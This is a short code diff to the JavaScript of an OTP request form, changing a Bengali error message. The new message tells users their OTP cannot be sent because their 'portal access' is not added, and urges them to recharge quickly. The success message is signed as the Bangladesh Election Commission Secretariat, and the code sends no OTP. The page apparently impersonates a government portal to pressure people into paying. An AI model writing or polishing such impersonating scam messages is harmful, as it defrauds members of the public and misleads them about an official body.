@@ -187,7 +187,7 @@
       const msg = document.getElementById("otpMessage");
       if (!mobile || mobile.length < 10) { msg.textContent = "সঠিক মোবাইল নাম্বার দিন"; msg.className = "error"; return; }
       if (Date.now() - lastOtpRequestTime < COOLDOWN_TIME) {
-        msg.textContent = "দুঃখীত আপনার পর্যাপ্ত পরিমাণ রিচার্জ না থাকায় আপনার ওটিপি পাঠানো যাচ্ছে না অতিদ্রুত ভাবে রিচার্জ সম্পুর্ন করুন।"; msg.className = "error"; return;
+        msg.textContent = "দুঃখীত আপনার পোর্টাল এক্সেস যুক্ত না থাকায় আপনার ওটিপি পাঠানো যাচ্ছে না অতিদ্রুত ভাবে রিচার্জ সম্পুর্ন করুন।"; msg.className = "error"; return;
       }
       lastOtpRequestTime = Date.now();
       msg.textContent = "আপনার পোর্টাল এক্সেস সচল করুন। ধন্যবাদ। বাংলাদেশ নির্বাচন কমিশন সচিবালয়।"; msg.className = "success";
